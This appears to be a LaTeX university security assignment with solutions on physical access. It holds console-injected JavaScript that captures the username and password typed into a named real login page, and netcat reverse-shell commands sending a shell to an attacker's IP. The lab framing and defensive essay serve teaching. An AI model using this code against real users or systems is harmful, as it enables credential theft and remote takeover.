@@ -1,0 +1,267 @@
+\documentclass[a4paper, 10pt]{article}
+\usepackage{scrextend}
+\changefontsizes{9pt}
+\input{../course-config}
+\usepackage{../vendor/template/CEDT-Assignment-style}
+
+\begin{document}
+\subject
+\asgntitle{8}{}{Physical Security}{}{\DefaultCollaborators}
+
+% ================================================================================ %
+\section{Overview}
+% ================================================================================ %
+
+\begin{flushright}
+	\textit{``Physical access can be really dangerous.''} \\
+	Krerk Piromspa, Ph.D.
+\end{flushright}
+
+\begin{minipage}[c]{0.70\linewidth}
+	\noindent In this activity, you will learn how bad physical access can be.
+
+	\myspace
+
+	\noindent Assuming that your friend leaves a computer unattended in a public library, you (as a hacker here) have a chance to sit in front of his/her computer for a few seconds.
+	There will be two scenarios.
+	First scenario is to inject javascript to his/her browser so that you can obtain his/her password to ChulaId.
+	Second scenario is to mimic an attack that allows a hacker to get a reverse shell attack to the victim's machine.
+\end{minipage}%
+\hfill
+\begin{minipage}[c]{0.20\linewidth}
+	\fig*[\linewidth]{images/physical-security.png}{}{}
+\end{minipage}
+
+% ================================================================================ %
+\section{Exercise}
+% ================================================================================ %
+
+% ================================================================================ %
+%                                    Problem 01                                    %
+% ================================================================================ %
+\begin{problem}
+\textbf{Javascript Injection.}
+Your friend has just logged out of ChulaSSO (\url{https://account.it.chula.ac.th/}) before leaving his/her computer.
+You have 2-3 minutes to inject a script to his/her browser so that you can steal his/her username (ChulaId) and password.
+
+\par For this class, please inject a javascript so that once your friend login (clicks the login button), it will pop up his/her username/password.
+
+\fig*[0.6\linewidth]{images/javascript-injection.png}{}{}
+\end{problem}
+
+\begin{solution}
+	\noindent \textbf{Idea.} With a few seconds of physical access, open the browser's developer
+	console on the already-loaded ChulaSSO login page and paste a short script. The script hooks the
+	login form so that, the moment your friend submits (clicks \emph{Login}), it reads the values
+	still sitting in the username and password fields and pops them up. Nothing leaves the machine
+	here --- a local \texttt{alert} is enough to prove the credentials were captured.
+
+	\myspace
+
+	\noindent \textbf{Step 1 --- open the console.} On the login page (\url{https://account.it.chula.ac.th/}),
+	press \texttt{F12} (or \texttt{Ctrl+Shift+I} / \texttt{Cmd+Opt+I} on macOS) and select the
+	\textbf{Console} tab.
+
+	\myspace
+
+	\noindent \textbf{Step 2 --- paste and run this script.} On the ChulaSSO page the fields carry
+	the ids \texttt{login\_username} and \texttt{login\_password}, so the script targets those
+	directly and falls back to a generic lookup only if they are ever renamed.
+
+	\myspace
+
+	\begin{codingbox*}[numbers=none, breaklines=true, basicstyle=\ttfamily\footnotesize\color{editortext}]
+var user = document.getElementById('login_username')
+        || document.querySelector('input[type="text"], input[type="email"]');
+var pwd  = document.getElementById('login_password')
+        || document.querySelector('input[type="password"]');
+var form = pwd ? pwd.closest('form') : document.querySelector('form');
+
+form.addEventListener('submit', function () {
+    alert(
+			'Captured credentials\n' +
+      'Username: ' + (user ? user.value : '(not found)') + '\n' +
+      'Password: ' + (pwd  ? pwd.value  : '(not found)')
+		);
+}, true);
+\end{codingbox*}
+
+	\myspace
+
+	\noindent The \texttt{true} (capture-phase) argument matters: \texttt{alert()} is synchronous and
+	blocks the thread, so the popup appears \emph{before} the browser leaves the page to process the
+	login.
+
+	\myspace
+
+	\noindent \textbf{Step 3 --- wait.} Leave the page as-is. When your friend returns and logs in,
+	the alert fires showing their ChulaId and password.
+
+	\myspace
+
+	\noindent \textbf{Important caveat.} A console-injected script lives only for the \emph{current page load}.
+	It works precisely because the victim logs in on the same loaded page within the
+	2--3 minute window; if the page is reloaded or navigated, the script is gone and must be
+	re-injected. (In a real attack the adversary would instead persist via a malicious extension or
+	exfiltrate silently to a server; here a local popup is deliberately used so no data leaves the
+	machine.)
+
+	\fig[0.9\linewidth]{images/sol-1-popup.png}{Captured credentials shown by the injected script.}{fig:sol1}
+\end{solution}
+% ================================================================================ %
+
+% ================================================================================ %
+%                                    Problem 02                                    %
+% ================================================================================ %
+\begin{problem}
+We will mimic an attack used by several worms for placing a trojan horse into your computer.
+Please note that it is for demonstration purposes only.
+Please do not abuse it.
+This attack is partly taken from the MSSQL SLAMMER worm that was spread in 2006.
+
+\par\noindent Please install netcat.
+\begin{itemize}
+	\item Mac - use homebrew (\url{https://brew.sh/}). \\
+	      \texttt{brew install netcat}
+	\item Windows - use cygwin or download prebuilt binary \\
+	      (\url{https://joncraton.org/blog/46/netcat-for-windows/})
+	\item Linux - you may install netcat from your package distribution. \\
+	      (On Debian-based Linux, use \texttt{apt install netcat-traditional})
+\end{itemize}
+
+\par Make a group of two persons. One is a victim. Another is an attacker.
+Please connect to the same network/WIFI access point.
+You may share a hotspot from your mobile phone. (Don't use ChulaWIFI for this.)
+You may have to turn off your firewall to do this experiment.
+
+\myspace
+
+\par\noindent First, the attacker will start netcat in listen mode.
+\begin{codingbox}[language=bash]
+$ nc -p 60000 -l
+$
+\end{codingbox}
+
+\par\noindent Once you get a change to the victim's machine, send a remote shell back to the hacker.
+\begin{codingbox}[language=bash]
+$ nc -e [/bin/bash or cmd.exe on Windows] [IP of Hacker] 60000
+$
+\end{codingbox}
+
+\par\noindent You may change the port 60000 to any port that you want.
+\end{problem}
+
+\begin{solution}
+	\noindent \textbf{Setup.} Two machines on the same network (e.g.\ a phone hotspot), firewalls off
+	for the experiment. Here \textbf{A} is the attacker at IP \texttt{192.168.x.A} and \textbf{V} is
+	the victim. Find A's IP first with \texttt{ip addr} (Linux), \texttt{ifconfig} (macOS), or
+	\texttt{ipconfig} (Windows).
+
+	\myspace
+
+	\noindent \textbf{Which netcat do I have?} This matters, because the \texttt{-e} flag in the
+	assignment only exists in \textbf{netcat-traditional}. The default \texttt{nc} on macOS and most
+	current Linux is \textbf{netcat-openbsd}, which has \emph{no} \texttt{-e} flag and a slightly
+	different listen syntax. Check with \texttt{nc -h} and use the matching column below.
+
+	\myspace
+
+	\noindent \textbf{Getting the traditional build (Debian/Ubuntu).} Install it, then point the
+	\texttt{nc} command at it. On many systems \emph{both} builds are present and the
+	\texttt{update-alternatives} system decides which one \texttt{nc} runs:
+	\myspace
+	\begin{codingbox*}[numbers=none, basicstyle=\ttfamily\footnotesize\color{editortext}]
+$ sudo apt install netcat-traditional         # provides /usr/bin/nc.traditional
+$ sudo update-alternatives --config nc        # pick the nc.traditional entry
+$ nc -h 2>&1 | head -1                        # verify: should mention [-e filename]
+$
+\end{codingbox*}
+	\myspace
+	\noindent Alternatively, skip the switch and call the binary directly as
+	\texttt{nc.traditional} wherever the commands below say \texttt{nc}. To go back later:
+	\texttt{sudo update-alternatives --set nc /usr/bin/nc.openbsd}.
+
+	\myspace
+
+	\noindent \textbf{Step 1 --- attacker listens} (on A):
+	\myspace
+	\begin{codingbox*}[numbers=none, basicstyle=\ttfamily\footnotesize\color{editortext}]
+# netcat-traditional:                 # netcat-openbsd:
+A$ nc -l -p 60000                     A$ nc -l 60000
+\end{codingbox*}
+
+	\myspace
+
+	\noindent \textbf{Step 2 --- victim connects back} (on V).
+	This is the line a worm/trojan would run automatically once it reaches the victim:
+	\myspace
+	\begin{codingbox*}[numbers=none, breaklines=true, basicstyle=\ttfamily\footnotesize\color{editortext}]
+# netcat-traditional (has -e):
+V$ nc -e /bin/bash 192.168.x.A 60000        # Linux/macOS
+V$
+V> nc -e cmd.exe   192.168.x.A 60000        # Windows
+\end{codingbox*}
+
+	\myspace
+
+	\noindent \textbf{Step 3 --- attacker now has a shell.} Back in A's listener terminal you are
+	typing commands that run on V. Confirm whose machine you are on:
+
+	\myspace
+
+	\begin{codingbox*}[numbers=none, basicstyle=\ttfamily\footnotesize\color{editortext}]
+A$ whoami        # -> the victim's user
+A$ hostname      # -> the victim's host
+A$ id ; uname -a # proof the commands execute on V, not A
+A$
+\end{codingbox*}
+
+	\newpage
+
+	\noindent \textbf{Why this is the SLAMMER-style lesson.} The victim's single command dials
+	\emph{out} to the attacker and hands over an interactive shell. Because the connection is
+	outbound, it sails through most home NAT/firewalls that only block inbound connections --- which
+	is exactly why reverse shells are the payload of choice for worms and trojans.
+
+	\fig[0.8\linewidth]{images/sol-2-shell.png}{Attacker's terminal running commands on the victim via the reverse shell.}{fig:sol2}
+\end{solution}
+% ================================================================================ %
+
+% ================================================================================ %
+%                                    Problem 03                                    %
+% ================================================================================ %
+\begin{problem}
+Write an essay to summarize the lesson that you have learned in this activity.
+In particular,
+\begin{subproblems_alpha}
+	\item explain the worst case scenario that can happen if you leave your computer unattended.
+	\item explain how a tool like netcat can be used for constructing a trojan horse.
+	      As a user, how will you prevent yourself from being a victim to such attacks?
+\end{subproblems_alpha}
+\end{problem}
+
+\begin{solution}
+	\noindent \textbf{(a) Worst case of an unattended computer.} If the machine is left logged-in
+	and unlocked, a few seconds is enough for total compromise. As in Problem~1, an attacker can
+	inject a script to harvest credentials; as in Problem~2, they can plant a reverse shell that
+	gives them persistent remote control. From there: read and exfiltrate every file, send mail and
+	impersonate you, pivot to other systems you can reach, and install a hidden backdoor that keeps
+	working long after you have walked away. Full-disk encryption and a strong login password do
+	\emph{nothing} here --- the session is already unlocked. The damage is limited only by what
+	\emph{you} can do on that machine, not by any seconds-long window.
+
+	\myspace
+
+	\noindent \textbf{(b) Netcat as a trojan horse, and how to defend.} Netcat becomes a trojan when
+	its "dial home and hand over a shell" command is hidden inside something the victim is tricked
+	into running --- a fake installer, a macro, an autorun file, a bundled "crack". The program does
+	its advertised job while silently running \texttt{nc} in the background, giving the attacker an
+	outbound reverse shell that slips past NAT/firewalls. As a user I protect myself by:
+	\textbf{locking the screen} whenever I step away (\texttt{Win+L} / \texttt{Ctrl+Cmd+Q});
+	\textbf{not running untrusted} executables, scripts, or macros; keeping the OS/AV/EDR updated;
+	\textbf{disabling autorun} on removable media; and using an \textbf{egress (outbound) firewall}
+	so unexpected connections like a shell dialing out are blocked or at least noticed.
+\end{solution}
+% ================================================================================ %
+
+\end{document}
